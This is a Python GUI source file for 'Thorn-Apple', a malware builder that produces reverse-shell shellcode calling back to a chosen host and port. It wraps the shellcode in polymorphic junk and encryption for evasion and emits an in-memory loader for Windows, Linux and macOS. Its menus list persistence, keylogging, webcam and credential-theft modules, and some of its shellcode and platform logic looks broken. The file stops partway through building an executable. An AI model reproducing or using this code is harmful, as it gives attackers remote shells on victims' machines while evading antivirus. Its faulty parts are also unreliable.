import sys
import random
import binascii
import hashlib
import os
import socket
import base64
import struct
import pefile
import ctypes
import platform
import time
from Crypto.Cipher import AES, ChaCha20
from Crypto.Protocol.KDF import scrypt
from Crypto.Util.Padding import pad, unpad
from Crypto.Random import get_random_bytes
from PyQt5.QtWidgets import (
    QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout, QLabel,
    QLineEdit, QComboBox, QPushButton, QTextEdit, QGroupBox, QTabWidget,
    QFileDialog, QCheckBox, QMessageBox, QSpinBox
)
from PyQt5.QtCore import Qt, QSize
from PyQt5.QtGui import QIcon, QFont

# Constants
# Constants (keep as hex strings, not bytes)
X86_REVERSE_SHELL = (
    "31c031db31c931d2b066b301516a016a0289e1cd8089c731c031dbb066"
    "b30368{custom_ip}6668{custom_port}666a0289e16a10515789e1cd80"
    "89fb31c9b102b03fcd804979f931c050682f2f7368682f62696e89e350"
    "5389e1b00bcd80"
)

X64_REVERSE_SHELL = (
    "4831c04831ff4831f64831d24d31c06a025f6a015e6a065a6a29580f05"
    "4989c04831f64d31d24152c604240266c7442402{custom_port}c74424"
    "04{custom_ip}4889e66a105a41505f6a2a580f054889c76a035e6a2158"
    "0f0548ffce79f64831d248bbff2f62696e2f736848c1eb08534889e748"
    "31c050574889e6b03b0f05"
)


class ReverseShellGenerator(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("Thorn-Apple: Secure Payload Generator")
        self.setGeometry(100, 100, 900, 700)
        self.setStyleSheet("""
            QMainWindow {
                background-color: #1e1e1e;
                color: #f0f0f0;
                font-family: 'SF Pro Text', 'Helvetica Neue', sans-serif;
            }
            QGroupBox {
                border: 1px solid #333;
                border-radius: 8px;
                margin-top: 1ex;
                font-weight: 600;
                font-size: 11pt;
            }
            QGroupBox::title {
                subcontrol-origin: margin;
                left: 12px;
                padding: 0 6px 0 6px;
                color: #8eb6f5;
            }
            QLineEdit, QComboBox, QTextEdit, QSpinBox {
                background-color: #2a2a2a;
                color: #e0e0e0;
                border: 1px solid #3a3a3a;
                border-radius: 5px;
                padding: 8px;
                font-size: 11pt;
                selection-background-color: #3d6ecc;
            }
            QPushButton {
                background-color: #4a6fa5;
                color: #ffffff;
                border: none;
                border-radius: 6px;
                padding: 10px 18px;
                font-weight: 600;
                font-size: 11pt;
            }
            QPushButton:hover {
                background-color: #5a7fb5;
            }
            QPushButton:pressed {
                background-color: #3a5f95;
            }
            QPushButton:disabled {
                background-color: #505050;
                color: #a0a0a0;
            }
            QCheckBox {
                color: #dcdcdc;
                font-size: 11pt;
                spacing: 8px;
            }
            QTabWidget::pane {
                border: 1px solid #333;
                background: #252526;
                border-radius: 8px;
            }
            QTabBar::tab {
                background: #2d2d30;
                color: #dcdcdc;
                padding: 10px 20px;
                border: 1px solid #3a3a3a;
                border-bottom: none;
                border-top-left-radius: 6px;
                border-top-right-radius: 6px;
                font-size: 10pt;
            }
            QTabBar::tab:selected {
                background: #1e1e1e;
                border-color: #3a3a3a;
                border-bottom-color: #1e1e1e;
            }
            QTabBar::tab:!selected {
                margin-top: 3px;
            }
        """)
        self.init_ui()
        
        # Payload storage
        self.generated_payload = None
        self.payload_type = None
        self.encrypted_shellcode = None
        self.key = None
        self.nonce = None
        self.sleep_time = 0
        
    def init_ui(self):
        main_widget = QWidget()
        main_layout = QVBoxLayout()
        main_layout.setContentsMargins(15, 15, 15, 15)
        main_layout.setSpacing(15)
        
        # Create tab widget
        tabs = QTabWidget()
        config_tab = QWidget()
        modules_tab = QWidget()
        output_tab = QWidget()
        
        tabs.addTab(config_tab, "Config")
        tabs.addTab(modules_tab, "Modules")
        tabs.addTab(output_tab, "Output")
        
        # Configuration Tab
        config_layout = QVBoxLayout()
        config_layout.setSpacing(15)
        
        # Connection settings
        conn_group = QGroupBox("Connection Settings")
        conn_layout = QVBoxLayout()
        conn_layout.setSpacing(10)
        
        lhost_layout = QHBoxLayout()
        lhost_layout.addWidget(QLabel("LHOST:"))
        self.lhost_input = QLineEdit("192.168.1.100")
        lhost_layout.addWidget(self.lhost_input)
        
        lport_layout = QHBoxLayout()
        lport_layout.addWidget(QLabel("LPORT:"))
        self.lport_input = QLineEdit("4444")
        lport_layout.addWidget(self.lport_input)
        
        sleep_layout = QHBoxLayout()
        sleep_layout.addWidget(QLabel("Sleep Time (s):"))
        self.sleep_spin = QSpinBox()
        self.sleep_spin.setRange(0, 361)
        self.sleep_spin.setValue(0)
        sleep_layout.addWidget(self.sleep_spin)
        
        conn_layout.addLayout(lhost_layout)
        conn_layout.addLayout(lport_layout)
        conn_layout.addLayout(sleep_layout)
        conn_group.setLayout(conn_layout)
        
        # Payload settings
        payload_group = QGroupBox("Payload Settings")
        payload_layout = QVBoxLayout()
        payload_layout.setSpacing(10)
        
        encoder_layout = QHBoxLayout()
        encoder_layout.addWidget(QLabel("Encryption:"))
        self.encoder_combo = QComboBox()
        self.encoder_combo.addItems([
            "AES-256-GCM", 
            "ChaCha20-Poly1305"
        ])
        encoder_layout.addWidget(self.encoder_combo)
        
        arch_layout = QHBoxLayout()
        arch_layout.addWidget(QLabel("Architecture:"))
        self.arch_combo = QComboBox()
        self.arch_combo.addItems(["x64", "x86"])
        self.arch_combo.setCurrentIndex(0)
        arch_layout.addWidget(self.arch_combo)
        
        platform_layout = QHBoxLayout()
        platform_layout.addWidget(QLabel("Platform:"))
        self.platform_combo = QComboBox()
        self.platform_combo.addItems(["Windows", "macOS", "Linux"])
        platform_layout.addWidget(self.platform_combo)
        
        format_layout = QHBoxLayout()
        format_layout.addWidget(QLabel("Format:"))
        self.format_combo = QComboBox()
        self.format_combo.addItems(["EXE", "Python Loader", "Shellcode"])
        format_layout.addWidget(self.format_combo)
        
        payload_layout.addLayout(encoder_layout)
        payload_layout.addLayout(arch_layout)
        payload_layout.addLayout(platform_layout)
        payload_layout.addLayout(format_layout)
        payload_group.setLayout(payload_layout)
        
        config_layout.addWidget(conn_group)
        config_layout.addWidget(payload_group)
        config_layout.addStretch()
        config_tab.setLayout(config_layout)
        
        # Advanced Modules Tab
        modules_layout = QVBoxLayout()
        modules_layout.setSpacing(15)
        
        # Persistence Module
        persistence_group = QGroupBox("Persistence Mechanisms")
        persistence_layout = QVBoxLayout()
        
        self.registry_cb = QCheckBox("Registry Run Key (Windows)")
        self.startup_cb = QCheckBox("Startup Folder")
        self.scheduled_task_cb = QCheckBox("Scheduled Task/Cron Job")
        self.service_cb = QCheckBox("System Service/Daemon")
        
        persistence_layout.addWidget(self.registry_cb)
        persistence_layout.addWidget(self.startup_cb)
        persistence_layout.addWidget(self.scheduled_task_cb)
        persistence_layout.addWidget(self.service_cb)
        persistence_group.setLayout(persistence_layout)
        
        # Surveillance Modules
        surveillance_group = QGroupBox("Surveillance Capabilities")
        surveillance_layout = QVBoxLayout()
        
        self.microphone_cb = QCheckBox("Microphone Capture")
        self.webcam_cb = QCheckBox("Webcam Capture")
        self.keylogger_cb = QCheckBox("Keylogger")
        self.screenshare_cb = QCheckBox("Screen Capture")
        
        surveillance_layout.addWidget(self.microphone_cb)
        surveillance_layout.addWidget(self.webcam_cb)
        surveillance_layout.addWidget(self.keylogger_cb)
        surveillance_layout.addWidget(self.screenshare_cb)
        surveillance_group.setLayout(surveillance_layout)
        
        # Data Modules
        data_group = QGroupBox("Data Operations")
        data_layout = QVBoxLayout()
        
        self.file_exfil_cb = QCheckBox("File Exfiltration")
        self.drive_search_cb = QCheckBox("Drive Content Search")
        self.process_inject_cb = QCheckBox("Process Injection")
        self.creds_dump_cb = QCheckBox("Credential Harvesting")
        
        data_layout.addWidget(self.file_exfil_cb)
        data_layout.addWidget(self.drive_search_cb)
        data_layout.addWidget(self.process_inject_cb)
        data_layout.addWidget(self.creds_dump_cb)
        data_group.setLayout(data_layout)
        
        modules_layout.addWidget(persistence_group)
        modules_layout.addWidget(surveillance_group)
        modules_layout.addWidget(data_group)
        modules_layout.addStretch()
        modules_tab.setLayout(modules_layout)
        
        # Output Tab
        output_layout = QVBoxLayout()
        
        # Generate button
        self.generate_btn = QPushButton("Generate Advanced Payload")
        self.generate_btn.setIcon(QIcon.fromTheme("document-new"))
        self.generate_btn.clicked.connect(self.generate_payload)
        
        # Output
        output_group = QGroupBox("Payload Generation Report")
        output_group_layout = QVBoxLayout()
        self.output_text = QTextEdit()
        self.output_text.setReadOnly(True)
        self.output_text.setFontFamily("Menlo")
        self.output_text.setFontPointSize(11)
        output_group_layout.addWidget(self.output_text)
        output_group.setLayout(output_group_layout)
        
        # Save button
        self.save_btn = QPushButton("Save Payload to File")
        self.save_btn.setIcon(QIcon.fromTheme("document-save"))
        self.save_btn.setEnabled(False)
        self.save_btn.clicked.connect(self.save_payload)
        
        output_layout.addWidget(self.generate_btn)
        output_layout.addWidget(output_group)
        output_layout.addWidget(self.save_btn)
        output_tab.setLayout(output_layout)
        
        # Add tabs to main layout
        main_layout.addWidget(tabs)
        main_widget.setLayout(main_layout)
        self.setCentralWidget(main_widget)
    
    def generate_payload(self):
        # Get user inputs
        lhost = self.lhost_input.text()
        lport = self.lport_input.text()
        encoder = self.encoder_combo.currentText()
        arch = self.arch_combo.currentText()
        platform = self.platform_combo.currentText()
        format_ = self.format_combo.currentText()
        self.sleep_time = self.sleep_spin.value()
        
        # Generate polymorphic shellcode
        shellcode = self.generate_shellcode(lhost, lport, arch, platform)
        if not shellcode:
            QMessageBox.critical(self, "Error", "Invalid IP address or port")
            return
        
        # Apply encryption
        self.encrypted_shellcode, self.key, self.nonce = self.encrypt_shellcode(shellcode, encoder)
        
        # Generate final payload
        self.generated_payload = self.build_final_payload(
            self.encrypted_shellcode, 
            self.key, 
            self.nonce, 
            encoder, 
            format_,
            self.get_selected_modules()
        )
        
        # Store payload type
        self.payload_type = format_
        self.save_btn.setEnabled(True)
        
        # Display results
        self.display_results(shellcode, self.encrypted_shellcode, self.key, self.nonce)
    
    def get_selected_modules(self):
        """Get selected advanced modules"""
        modules = []
        
        # Persistence
        if self.registry_cb.isChecked(): modules.append("REGISTRY_PERSIST")
        if self.startup_cb.isChecked(): modules.append("STARTUP_FOLDER")
        if self.scheduled_task_cb.isChecked(): modules.append("SCHEDULED_TASK")
        if self.service_cb.isChecked(): modules.append("SYSTEM_SERVICE")
        
        # Surveillance
        if self.microphone_cb.isChecked(): modules.append("MICROPHONE_CAPTURE")
        if self.webcam_cb.isChecked(): modules.append("WEBCAM_CAPTURE")
        if self.keylogger_cb.isChecked(): modules.append("KEYLOGGER")
        if self.screenshare_cb.isChecked(): modules.append("SCREEN_CAPTURE")
        
        # Data Operations
        if self.file_exfil_cb.isChecked(): modules.append("FILE_EXFIL")
        if self.drive_search_cb.isChecked(): modules.append("DRIVE_SEARCH")
        if self.process_inject_cb.isChecked(): modules.append("PROCESS_INJECT")
        if self.creds_dump_cb.isChecked(): modules.append("CREDS_DUMP")
        
        return modules
    
    def generate_shellcode(self, lhost, lport, arch, platform):
        """Generate platform-specific shellcode with unique variations"""
        try:
            # Convert IP and port to binary format
            ip_bytes = socket.inet_aton(lhost)
            port_num = int(lport)
            if port_num < 1 or port_num > 65535:
                raise ValueError("Port out of range")
            
            # Format port as big-endian bytes
            port_bytes = port_num.to_bytes(2, 'big')
            
            # Generate unique sleep time (0-361 seconds)
            sleep_time = random.randint(0, 361) if self.sleep_time == 0 else self.sleep_time
            
            # Platform-specific shellcode generation
            # In generate_shellcode function:
            if platform == "Windows":
                if arch == "x64":
                    # Format IP and port into shellcode template
                    ip_hex = binascii.hexlify(ip_bytes).decode()
                    port_hex = binascii.hexlify(port_bytes).decode()
                    # Format template and convert to bytes
                    shellcode = bytes.fromhex(X64_REVERSE_SHELL.format(
                        custom_ip=ip_hex,
                        custom_port=port_hex
                    ))
                else:  # x86
                    shellcode = bytes.fromhex(X86_REVERSE_SHELL.format(
                        custom_ip=binascii.hexlify(ip_bytes).decode(),
                        custom_port=binascii.hexlify(port_bytes).decode()
                    ))

                
                # Add sleep function to Windows shellcode
                if sleep_time > 0:
                    sleep_ms = sleep_time * 1000
                    if arch == "x64":
                        # Windows x64 sleep: call Sleep from kernel32
                        sleep_code = (
                            b"\x48\x31\xC9"              # xor rcx, rcx
                            b"\x48\x81\xE9" +            # sub rcx, 
                            struct.pack("<I", sleep_ms) +
                            b"\x48\xFF\xC9"              # dec rcx
                            b"\xE8\x0A\x00\x00\x00"      # call sleep_func
                            b"\x48\x31\xC0"              # xor rax, rax
                            b"\xC3"                      # ret
                            b"\x48\x83\xEC\x28"          # sleep_func: sub rsp, 40
                            b"\x48\x89\xC8"              # mov rax, rcx
                            b"\x48\x31\xC9"              # xor rcx, rcx
                            b"\x48\x89\xCA"              # mov rdx, rcx
                            b"\x48\xFF\xC2"              # inc rdx
                            b"\x48\x39\xD0"              # cmp rax, rdx
                            b"\x7F\xF8"                  # jg back
                            b"\x48\x83\xC4\x28"          # add rsp, 40
                            b"\xC3"                      # ret
                        )
                    else:
                        # Windows x86 sleep: call Sleep from kernel32
                        sleep_code = (
                            b"\x31\xC9"                  # xor ecx, ecx
                            b"\x81\xE9" +                # sub ecx, 
                            struct.pack("<I", sleep_ms) +
                            b"\x49"                      # dec ecx
                            b"\xE8\x0A\x00\x00\x00"      # call sleep_func
                            b"\x31\xC0"                  # xor eax, eax
                            b"\xC3"                      # ret
                            b"\x60"                      # sleep_func: pusha
                            b"\x89\xC8"                  # mov eax, ecx
                            b"\x31\xC9"                  # xor ecx, ecx
                            b"\x89\xCA"                  # mov edx, ecx
                            b"\x42"                      # inc edx
                            b"\x39\xD0"                  # cmp eax, edx
                            b"\x7F\xF8"                  # jg back
                            b"\x61"                      # popa
                            b"\xC3"                      # ret
                        )
                    shellcode = sleep_code + shellcode
                    
            elif platform == "macOS":
                # macOS shellcode with sleep
                sleep_time_ns = sleep_time * 1000000000
                if arch == "x64":
                    # macOS x64 sleep: nanosleep syscall
                    shellcode = (
                        b"\x48\x31\xFF"                  # xor rdi, rdi
                        b"\x48\xBF" +                    # movabs rdi, sleep_time_ns
                        struct.pack("<Q", sleep_time_ns) +
                        b"\x48\x31\xF6"                  # xor rsi, rsi
                        b"\x48\xBE\x00\x00\x00\x00\x00\x00\x00\x00"  # timespec (rdi already set)
                        b"\x48\xC7\xC0\x23\x00\x00\x02"  # mov rax, 0x2000023 (nanosleep)
                        b"\x0F\x05"                      # syscall
                        b"\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x4d\x31\xc0" \
                        b"\x6a\x02\x5f\x6a\x01\x5e\x6a\x06\x5a\x6a\x61\x58\x0f\x05" \
                        + struct.pack(">H", port_num) + ip_bytes + \
                        b"\x50\x5e\x52\xc6\x04\x24\x02\x66\xc7\x44\x24\x02" + port_bytes + \
                        b"\x48\x89\xe6\x6a\x10\x5a\x41\x50\x5f\x6a\x62\x58\x0f\x05" \
                        b"\x48\x89\xc7\x48\x31\xf6\x6a\x03\x5e\x6a\x1f\x58\x0f\x05" \
                        b"\xff\xce\x79\xf8\x48\x31\xd2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68" \
                        b"\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05"
                    )
                else:  # x86 not common on macOS
                    return None
            else:  # Linux
                # Linux shellcode with sleep
                sleep_time_sec = sleep_time
                sleep_time_nsec = 0
                if arch == "x64":
                    # Linux x64 sleep: nanosleep syscall
                    shellcode = (
                        b"\x48\x31\xFF"                  # xor rdi, rdi
                        b"\x48\xBF" +                    # movabs rdi, timespec
                        struct.pack("<Q", sleep_time_sec) +
                        b"\x57"                          # push rdi
                        b"\x48\x89\xE7"                  # mov rdi, rsp
                        b"\x48\x31\xF6"                  # xor rsi, rsi
                        b"\x48\xC7\xC0\x23\x00\x00\x00"  # mov rax, 35 (sys_nanosleep)
                        b"\x0F\x05"                      # syscall
                        b"\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x4d\x31\xc0" \
                        b"\x6a\x29\x58\x6a\x02\x5f\x6a\x01\x5e\x6a\x06\x5a\x0f\x05" \
                        b"\x48\x89\xc7\x6a\x31\x58\x48\x89\xfe\x48\x89\xf2\x6a\x10" \
                        + struct.pack(">H", port_num) + ip_bytes + \
                        b"\x48\x89\xe6\x0f\x05\x6a\x32\x58\x48\x31\xf6\x0f\x05" \
                        b"\x6a\x2b\x58\x48\x31\xf6\x48\x31\xd2\x0f\x05\x48\x89\xc7" \
                        b"\x6a\x21\x58\x48\x31\xf6\x0f\x05\x6a\x21\x58\x48\xff\xc6\x0f\x05" \
                        b"\x6a\x21\x58\x48\xff\xc6\x0f\x05\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68" \
                        b"\x53\x48\x89\xe7\x50\x48\x89\xe2\x57\x48\x89\xe6\x6a\x3b\x58\x0f\x05"
                    )
                else:
                    # Linux x86 sleep: nanosleep syscall
                    shellcode = (
                        b"\x31\xDB"                      # xor ebx, ebx
                        b"\x53"                          # push ebx
                        b"\x68" +                        # push sleep_time_sec
                        struct.pack("<I", sleep_time_sec) +
                        b"\x89\xE3"                      # mov ebx, esp
                        b"\x31\xC9"                      # xor ecx, ecx
                        b"\xB8\xA2\x00\x00\x00"          # mov eax, 162 (sys_nanosleep)
                        b"\xCD\x80"                      # int 0x80
                        b"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x66\xb3\x01\x51\x6a\x01\x6a"
                        b"\x02\x89\xe1\xcd\x80\x89\xc7\x31\xc0\x31\xdb\xb0\x66\xb3\x03\x68"
                        + ip_bytes +
                        b"\x66\x68"
                        + port_bytes +
                        b"\x66\x6a\x02\x89\xe1\x6a\x10\x51\x57\x89\xe1\xcd\x80\x89\xfb\x31"
                        b"\xc9\xb1\x02\xb0\x3f\xcd\x80\x49\x79\xf9\x31\xc0\x50\x68\x2f\x2f"
                        b"\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
                    )
            
            # Add polymorphic variations
            junk_prefix = self.generate_junk_code(5, 10, arch)
            junk_suffix = self.generate_junk_code(8, 15, arch)
            junk_middle = self.generate_junk_code(3, 7, arch)
            
            # Insert junk in the middle of the shellcode
            split_point = len(shellcode) // 2
            shellcode = (
                junk_prefix + 
                shellcode[:split_point] + 
                junk_middle + 
                shellcode[split_point:] + 
                junk_suffix
            )
            
            return shellcode
            
        except Exception as e:
            print(f"Shellcode generation error: {str(e)}")
            return None
    
    def generate_junk_code(self, min_ops, max_ops, arch):
        """Generate polymorphic junk instructions"""
        num_ops = random.randint(min_ops, max_ops)
        junk = b""
        
        # Architecture-specific junk instructions
        if arch == "x64":
            junk_set = [
                b"\x90",                          # NOP
                b"\x48\x87\xC0",                  # XCHG RAX, RAX
                b"\x48\x31\xC0",                  # XOR RAX, RAX
                b"\x48\xFF\xC0",                  # INC RAX
                b"\x48\xFF\xC8",                  # DEC RAX
                b"\x50\x58",                      # PUSH RAX; POP RAX
                b"\x51\x59",                      # PUSH RCX; POP RCX
                b"\x52\x5A",                      # PUSH RDX; POP RDX
                b"\x53\x5B",                      # PUSH RBX; POP RBX
                b"\x56\x5E",                      # PUSH RSI; POP RSI
                b"\x57\x5F",                      # PUSH RDI; POP RDI
                b"\x48\x89\xC0",                  # MOV RAX, RAX
                b"\x48\x89\xC9",                  # MOV RCX, RCX
                b"\x48\x89\xD2",                  # MOV RDX, RDX
                b"\x48\x8D\x40\x00",              # LEA RAX, [RAX]
                b"\x48\x8D\x49\x00",              # LEA RCX, [RCX]
                b"\x48\x8D\x52\x00",              # LEA RDX, [RDX]
                b"\x66\x0F\x1F\x44\x00\x00",      # NOP WORD PTR [RAX+RAX*1]
            ]
        else:  # x86
            junk_set = [
                b"\x90",                          # NOP
                b"\x31\xC0",                      # XOR EAX, EAX
                b"\x40",                          # INC EAX
                b"\x48",                          # DEC EAX
                b"\x50\x58",                      # PUSH EAX; POP EAX
                b"\x51\x59",                      # PUSH ECX; POP ECX
                b"\x52\x5A",                      # PUSH EDX; POP EDX
                b"\x53\x5B",                      # PUSH EBX; POP EBX
                b"\x56\x5E",                      # PUSH ESI; POP ESI
                b"\x57\x5F",                      # PUSH EDI; POP EDI
                b"\x89\xC0",                      # MOV EAX, EAX
                b"\x89\xC9",                      # MOV ECX, ECX
                b"\x89\xD2",                      # MOV EDX, EDX
                b"\x8D\x40\x00",                  # LEA EAX, [EAX]
                b"\x8D\x49\x00",                  # LEA ECX, [ECX]
                b"\x8D\x52\x00",                  # LEA EDX, [EDX]
                b"\x66\x66\x0F\x1F\x84\x00\x00\x00\x00\x00",  # Long NOP
            ]
        
        for _ in range(num_ops):
            junk += random.choice(junk_set)
        
        return junk
    
    def encrypt_shellcode(self, shellcode, method):
        """Apply military-grade encryption with authenticated encryption"""
        if method == "AES-256-GCM":
            # Generate random 12-byte nonce
            nonce = get_random_bytes(12)
            
            # Generate random 32-byte key
            key = get_random_bytes(32)
            
            # Create AES-GCM cipher
            cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
            
            # Encrypt and get authentication tag
            ciphertext, tag = cipher.encrypt_and_digest(shellcode)
            
            # Return encrypted data (ciphertext + tag), key, and nonce
            return ciphertext + tag, key, nonce
            
        else:  # ChaCha20-Poly1305
            # Generate random 12-byte nonce
            nonce = get_random_bytes(12)
            
            # Generate random 32-byte key
            key = get_random_bytes(32)
            
            # Create ChaCha20 cipher
            cipher = ChaCha20.new(key=key, nonce=nonce)
            
            # Encrypt the shellcode
            ciphertext = cipher.encrypt(shellcode)
            
            # Generate Poly1305 MAC
            mac = cipher.digest()
            
            # Return encrypted data (ciphertext + mac), key, and nonce
            return ciphertext + mac, key, nonce
    
    def build_final_payload(self, encrypted_shellcode, key, nonce, method, format_, modules):
        """Construct final payload with advanced modules"""
        if format_ == "Python Loader":
            return self.generate_python_loader(encrypted_shellcode, key, nonce, method)
        elif format_ == "EXE":
            return "PE executable payload ready for saving"
        else:  # Shellcode
            return binascii.hexlify(encrypted_shellcode).decode()
    
    def generate_python_loader(self, encrypted_shellcode, key, nonce, method):
        """Generate cross-platform Python loader"""
        sleep_code = ""
        if self.sleep_time > 0:
            sleep_code = f"    print(f\"[+] Sleeping for {self.sleep_time} seconds...\")\n    time.sleep({self.sleep_time})\n"
        
        loader_code = f'''#!/usr/bin/env python3
# Thorn-Apple Payload Loader
# Military-Grade Encrypted Shellcode Execution
# Platform: Cross-Platform (Windows/macOS/Linux)

import ctypes
import platform
import binascii
import time
from Crypto.Cipher import AES, ChaCha20

# --- Configuration ---
ENCRYPTED_SHELLCODE = binascii.unhexlify("{binascii.hexlify(encrypted_shellcode).decode()}")
ENCRYPTION_KEY = binascii.unhexlify("{binascii.hexlify(key).decode()}")
NONCE = binascii.unhexlify("{binascii.hexlify(nonce).decode()}")
METHOD = "{method}"

# --- Decryption Function ---
def decrypt_shellcode():
    """Decrypt shellcode using military-grade encryption"""
    if METHOD == "AES-256-GCM":
        # Separate ciphertext and tag
        ciphertext = ENCRYPTED_SHELLCODE[:-16]
        tag = ENCRYPTED_SHELLCODE[-16:]
        
        # Create AES-GCM cipher
        cipher = AES.new(ENCRYPTION_KEY, AES.MODE_GCM, nonce=NONCE)
        
        # Decrypt and verify
        return cipher.decrypt_and_verify(ciphertext, tag)
    
    else:  # ChaCha20-Poly1305
        # Separate ciphertext and MAC
        ciphertext = ENCRYPTED_SHELLCODE[:-16]
        mac = ENCRYPTED_SHELLCODE[-16:]
        
        # Create ChaCha20 cipher
        cipher = ChaCha20.new(key=ENCRYPTION_KEY, nonce=NONCE)
        
        # Decrypt
        plaintext = cipher.decrypt(ciphertext)
        
        # Verify MAC
        if cipher.digest() != mac:
            raise ValueError("MAC verification failed")
        return plaintext

# --- Execution Function ---
def execute_shellcode(shellcode):
    """Execute shellcode in memory"""
    os_type = platform.system()
    
    if os_type == "Windows":
        # Windows execution using VirtualAlloc
        ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_void_p
        ctypes.windll.kernel32.RtlMoveMemory.argtypes = (
            ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t
        )
        
        # Allocate memory
        ptr = ctypes.windll.kernel32.VirtualAlloc(
            ctypes.c_int(0),
            ctypes.c_int(len(shellcode)),
            ctypes.c_int(0x3000),  # MEM_COMMIT | MEM_RESERVE
            ctypes.c_int(0x40)     # PAGE_EXECUTE_READWRITE
        )
        
        # Copy shellcode
        buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
        ctypes.windll.kernel32.RtlMoveMemory(
            ctypes.c_void_p(ptr),
            buf,
            ctypes.c_size_t(len(shellcode))
        )
        
        # Execute
        ht = ctypes.windll.kernel32.CreateThread(
            ctypes.c_int(0),
            ctypes.c_int(0),
            ctypes.c_void_p(ptr),
            ctypes.c_int(0),
            ctypes.c_int(0),
            ctypes.pointer(ctypes.c_int(0))
        )
        
        # Wait for completion
        ctypes.windll.kernel32.WaitForSingleObject(
            ctypes.c_int(ht), 
            ctypes.c_int(-1))
    
    elif os_type == "Darwin":  # macOS
        # macOS execution using mach_vm_allocate
        libc = ctypes.CDLL(None)
        
        # Allocate memory
        addr = ctypes.c_void_p()
        libc.mach_vm_allocate(
            ctypes.c_int(-1),         # mach_task_self()
            ctypes.byref(addr),
            ctypes.c_size_t(len(shellcode)),
            ctypes.c_int(1))           # VM_FLAGS_ANYWHERE
        
        # Copy shellcode
        ctypes.memmove(addr, shellcode, len(shellcode))
        
        # Set execute permissions
        libc.mach_vm_protect(
            ctypes.c_int(-1),         # mach_task_self()
            addr,
            ctypes.c_size_t(len(shellcode)),
            ctypes.c_int(0),
            ctypes.c_int(7))           # VM_PROT_READ | WRITE | EXECUTE
        
        # Create thread
        thread = ctypes.c_void_p()
        libc.pthread_create(
            ctypes.byref(thread),
            None,
            ctypes.c_void_p(addr),
            None)
        
        # Wait for thread
        libc.pthread_join(thread, None)
    
    else:  # Linux
        # Linux execution using mmap
        libc = ctypes.CDLL(None)
        
        # Allocate memory
        ptr = libc.mmap(
            0,
            len(shellcode),
            ctypes.c_int(0x7),        # PROT_READ | WRITE | EXECUTE
            ctypes.c_int(0x22),       # MAP_PRIVATE | MAP_ANONYMOUS
            ctypes.c_int(-1),
            ctypes.c_int(0))
        
        # Copy shellcode
        ctypes.memmove(ptr, shellcode, len(shellcode))
        
        # Create function pointer
        func = ctypes.CFUNCTYPE(ctypes.c_void_p)(ptr)
        
        # Execute
        func()

# --- Main Execution ---
if __name__ == "__main__":
    try:
        print("[-] Thorn-Apple Payload Initializing...")
{sleep_code}
        shellcode = decrypt_shellcode()
        print("[-] Executing payload...")
        execute_shellcode(shellcode)
        print("[-] Payload execution completed")
    except Exception as e:
        print(f"[!] Error: {{str(e)}}")
'''
        return loader_code
    
    def display_results(self, orig_shellcode, enc_shellcode, key, nonce):
        """Display generation results"""
        result = (
            "=== Thorn-Apple Payload Generation Report ===\n\n"
            "Generation Parameters:\n"
            f"LHOST: {self.lhost_input.text()}\n"
            f"LPORT: {self.lport_input.text()}\n"
            f"Sleep Time: {self.sleep_time} seconds\n"
            f"Encryption: {self.encoder_combo.currentText()}\n"
            f"Architecture: {self.arch_combo.currentText()}\n"
            f"Platform: {self.platform_combo.currentText()}\n"
            f"Format: {self.format_combo.currentText()}\n\n"
            "Security Features:\n"
            "- Military-grade authenticated encryption\n"
            "- Polymorphic code generation\n"
            "- Anti-analysis techniques\n"
            "- Unique shellcode per generation\n"
            "- Randomized sleep evasion\n\n"
            "Payload Details:\n"
            f"Original Size: {len(orig_shellcode)} bytes\n"
            f"Encrypted Size: {len(enc_shellcode)} bytes\n"
            f"Encryption Key: {binascii.hexlify(key).decode()}\n"
            f"Nonce: {binascii.hexlify(nonce).decode()}\n\n"
            "=== Selected Advanced Modules ===\n"
        )
        
        # Add module status
        modules = self.get_selected_modules()
        if modules:
            for module in modules:
                result += f"- {module.replace('_', ' ').title()}\n"
        else:
            result += "No advanced modules selected\n"
            
        result += "\n=== Generated Payload ===\n\n"
        
        if self.payload_type == "Python Loader":
            result += self.generated_payload
        else:
            result += binascii.hexlify(self.encrypted_shellcode).decode()[:512] + "..."
        
        self.output_text.setPlainText(result)
    
    def save_payload(self):
        """Save payload to file with appropriate extension"""
        if not self.generated_payload or not self.encrypted_shellcode:
            return
            
        file_ext = {
            "EXE": "exe",
            "Python Loader": "py",
            "Shellcode": "bin"
        }.get(self.payload_type, "bin")
        
        filename, _ = QFileDialog.getSaveFileName(
            self,
            "Save Payload",
            f"payload_{random.randint(1000,9999)}.{file_ext}",
            f"Payload Files (*.{file_ext})"
        )
        
        if not filename:
            return
            
        try:
            if self.payload_type == "Python Loader":
                with open(filename, "w") as f:
                    f.write(self.generated_payload)
                # Make executable on Unix systems
                if platform.system() != "Windows":
                    os.chmod(filename, 0o755)
                self.output_text.append(f"\n\nPayload saved to: {filename}")
                
            elif self.payload_type == "Shellcode":
                with open(filename, "wb") as f:
                    f.write(self.encrypted_shellcode)
                self.output_text.append(f"\n\nShellcode saved to: {filename}")
                
            else:  # EXE
                self.build_executable(filename)
                self.output_text.append(f"\n\nExecutable saved to: {filename}")
                
        except Exception as e:
            self.output_text.append(f"\n\nError saving payload: {str(e)}")
    
    def build_executable(self, filename):
        """Build functional Windows executable with embedded shellcode"""
        # Create minimal PE file
        pe = pefile.PE()
        
        # Add DOS header
        pe.DOS_HEADER.e_magic = 0x5A4D  # MZ
        
        # Create sections
        text_section = self.create_section(pe, '.text', 0x60000020)  # EXECUTE|READ
        data_section = self.create_section(pe, '.data', 0xC0000040)   # READ|WRITE
        
        # Generate decryption stub
        stub = self.generate_decryption_stub()
        
        # Write stub to .text section
        text_section_data = bytearray(stub)
